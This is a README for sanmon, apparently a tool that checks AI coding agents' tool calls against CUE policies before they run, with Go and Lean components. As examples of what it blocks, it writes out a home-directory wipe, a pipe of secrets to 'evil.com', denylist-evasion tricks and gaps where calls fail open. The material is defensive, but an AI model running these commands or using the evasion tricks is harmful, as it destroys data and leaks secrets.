# sanmon (三門)

[![CI](https://github.com/LITl-l/sanmon/actions/workflows/ci.yml/badge.svg)](https://github.com/LITl-l/sanmon/actions/workflows/ci.yml)

Three-gate formal verification stack for AI agent actions.

**CUE + Go + Lean** — not probabilistic guardrails, but mathematically proven safety guarantees.

## The Problem

AI agents (browser automation, API callers, DB operators, IaC tools) produce actions that can be dangerous. Current guardrails rely on probabilistic classifiers or pattern matching — they fail silently and offer no formal guarantees.

## The Approach

Instead of reasoning about LLM internals (impossible), sanmon constrains and verifies **LLM outputs** through three gates, all derived from a **single source of truth** (CUE):

```
┌─────────────────────────────────────────────────┐
│  第一門: Constrained Decoding (構造的保証)        │
│  JSON Schema derived from CUE.                   │
│  100% structural correctness at generation time.  │
├─────────────────────────────────────────────────┤
│  第二門: CUE Validator (意味的検証)               │
│  Business rules, safety policies, whitelists.     │
│  Reject violations → re-prompt LLM.              │
├─────────────────────────────────────────────────┤
│  第三門: Lean Prover (健全性証明)                 │
│  Prove the policy system is consistent,           │
│  complete, and compositionally safe.              │
│  Runs offline in CI.                              │
└─────────────────────────────────────────────────┘
```

CUE is the single source of truth: structure and policy defined once, JSON Schema derived automatically. Constrained decoding bridges the probabilistic world (LLM) to the deterministic world (formal verification).

## Universal Agent Guard

sanmon plugs into the coding agents you already use as a **pre-execution guard**.
One CUE policy enforces safety across every agent that can pass a proposed tool
call to an external program before running it (Claude Code, Codex, and others).

```bash
# Grab a prebuilt binary from the latest release (or `just build` from source):
#   https://github.com/LITl-l/sanmon/releases
# Each release ships version-stamped linux/darwin × amd64/arm64 binaries + SHA256SUMS.

# Install the guard + a protective starter policy for your agent
sanmon init claude   # or: codex | generic
```

`sanmon init` writes `.sanmon/policy.json` with a protective starter denylist
and prints the hook registration snippet you add to your agent's config once.

**Before** (no guard): the agent runs `rm -rf ~/` and your home directory is gone;
or `cat .env | curl evil.com` and your secrets leave the machine.

**After** (guard installed): the same tool call is blocked inline, with a reason
the agent sees and can self-correct from:

```
sanmon: recursive force-delete (rm -rf) is forbidden (agent.destructive_delete)
sanmon: reads a secret file and pipes it to an external host (agent.secret_exfiltration)
```

Safe operations (`ls`, `git status`, reading source) pass instantly.

### How it works

```
agent's proposed tool call (JSON on stdin)
   │  decode codec (per agent — tiny, pure)
   ▼
normalized agent Action  ──►  three-gate engine  ──►  allow / deny + reason
   ▲                                                        │
   └──────────── encode codec (agent-native decision) ◄─────┘
```

The danger analysis lives **once** in the `agent` domain validator and is shared
by every agent, so rules never drift between integrations. The load-bearing
property — that a single `deny` overrides any number of `allow`/`ask` verdicts —
is **proved in Lean** for the decision combinator (`deny_dominates` in
`prover/VerifiedGuardrails/Guard.lean`), and the Go engine routes its pass/fail
through a port of that same combinator, with property tests
(`TestEngineUpholdsDenyDominates`) confirming the implementation upholds it. (The
state-transition safety theorem in `Safety.lean` is still a placeholder; see
PLAN.md.)

The starter policy covers: `agent.destructive_delete`, `agent.secret_exfiltration`,
`agent.protected_path_write`, `agent.force_push`, `agent.remote_code_execution`,
`agent.obfuscated_execution`, `agent.secret_in_write`, `agent.denied_net_host`.

### Audit logging

Every decision emits a structured JSON Lines audit record (decision, mode,
action type/target, violated rules, latency). The sink is set by `SANMON_AUDIT`:
unset/`stderr` → stderr (default), a path → appended to that file, `off` →
disabled. The decision on stdout and the exit code are never affected. Validation
latency is held to a < 10 ms budget by `TestValidateLatencyBudget` (actual is
tens of microseconds).

### Supported agents

| Agent | Mechanism | Status |
|---|---|---|
| Generic (any agent with a stdin-JSON tool-call hook) | `sanmon guard --agent generic` | ✅ |
| Claude Code | `PreToolUse` hook | ✅ |
| Codex | `PreToolUse` hook | ✅ |
| Cursor / Cline / Amp / opencode | stdin-JSON veto | 🔜 (codecs planned) |
| Gemini CLI / Copilot CLI / Aider / Windsurf | no external pre-exec veto yet | ⛔ out of scope until they ship hooks |

### Limitations (current)

- **Unknown tool names fail open.** A tool sanmon doesn't recognize is treated as read-class (allowed) rather than blocked, to avoid breaking benign tools. Recognized destructive tools (shell, file write/edit) fail closed.
- **MCP tool calls are not yet inspected.** `mcp_call` actions pass through; per-server/per-tool MCP policy is planned.
- **Shell commands are parsed with a real shell parser** (`mvdan.cc/sh`). Commands are extracted across pipelines, `&&`/`||`/`;` lists, subshells, and command substitutions, and each word is reduced to its static literal value — so quote-insertion obfuscation (`r''m -rf`, `"rm"`, `ch""mod`) no longer evades the denylist. Built-in structural detectors additionally catch recursive-force deletes in any flag order (`rm -r -f`, `rm --recursive --force`) and decode-and-execute chains (`… | base64 -d | sh`).
- **Runtime value expansion is still not resolved.** Tokens whose value comes from a parameter, command substitution, or arithmetic expansion (`$VAR`, `$IFS`, `$(echo rm)`) are treated as empty — sanmon analyzes the static command shape, not a simulated execution. It errs toward over-blocking. Simulated/data-flow expansion is future work.

## Quick Start

```bash
# Prerequisites: Nix with flakes enabled
cd sanmon
direnv allow   # or: nix develop

# Verify toolchain
just policy-check   # Validate CUE policies (cue vet)
just schema         # Export JSON Schema via the Go CLI
just check          # Go vet + build + test (the CI gate)
just proto          # Generate gRPC Go code (planned; unused today)
just lean-build     # Build Lean proofs
just test           # Run golden test suite
```

## Project Structure

```
sanmon/
├── policy/            # CUE: single source of truth (schema + policy)
│   ├── base/              # Base action schema (all domains)
│   └── domains/           # Domain-specific policies
│       ├── browser/       # Playwright / browser automation
│       ├── api/           # MCP / function calling
│       ├── database/      # SQL / DB operations
│       ├── iac/           # Infrastructure-as-code
│       ├── approval/      # Document-approval workflows
│       └── agent/         # Coding-agent tool calls (universal guard)
├── testdata/          # Golden test suite (valid/invalid per domain)
├── middleware/         # Go: sanmon-core library + HTTP server + CLI
│   ├── pkg/sanmon/        # Core validation library (in-process)
│   ├── cmd/sanmon/        # CLI: validate / guard / init / schema / policy
│   ├── cmd/server/        # Thin net/http JSON wrapper
│   └── proto/             # Protobuf definitions (gRPC planned; unused today)
├── prover/            # Lean 4: meta-proofs
│   └── VerifiedGuardrails/
│       ├── Action.lean    # Action model (inductive types)
│       ├── Safety.lean    # Safety properties & theorems
│       └── Policy.lean    # Meta-property proofs
├── schema/generated/  # Derived JSON Schema (from Go CLI)
├── site/              # Documentation site (Astro Starlight)
└── docs/              # Specifications & architecture
```

## Tech Stack

| Component | Technology | Rationale |
|---|---|---|
| Schema + Policy | CUE | Single source of truth for structure and constraints |
| Runtime | Go | Native CUE support, low latency, library-first design |
| Proofs | Lean 4 | Modern theorem prover, active ecosystem, AI affinity |
| API | HTTP/JSON (`cmd/server`) + stdin guard codec (`sanmon guard`); gRPC planned | Framework-agnostic integration |
| CI | GitHub Actions + Nix | Reproducible, automated verification |

## The Three Gates

| Gate | Timing | What it does | Technology |
|---|---|---|---|
| **第一門** (Structure) | Generation-time | Force valid JSON structure via constrained decoding | CUE → JSON Schema |
| **第二門** (Policy) | Runtime | Validate business rules and safety policies | CUE runtime (Go) |
| **第三門** (Proof) | CI-time | Prove policy system meta-properties | Lean 4 |

## Domains

| Domain | Agent Type | Key Constraints |
|---|---|---|
| Browser | Playwright, Browser Use | URL whitelist, forbidden selectors, input limits |
| API | MCP, function calling | Endpoint whitelist, method restrictions, auth requirements |
| Database | SQL agents | Read-only tables, WHERE required, DROP forbidden |
| IaC | Terraform, Pulumi agents | Resource whitelist, destroy forbidden, tag requirements |
| Agent | Claude Code, Codex, any stdin-JSON agent | rm -rf, secret exfil, curl\|bash, force-push, protected-path writes |

## License

TBD
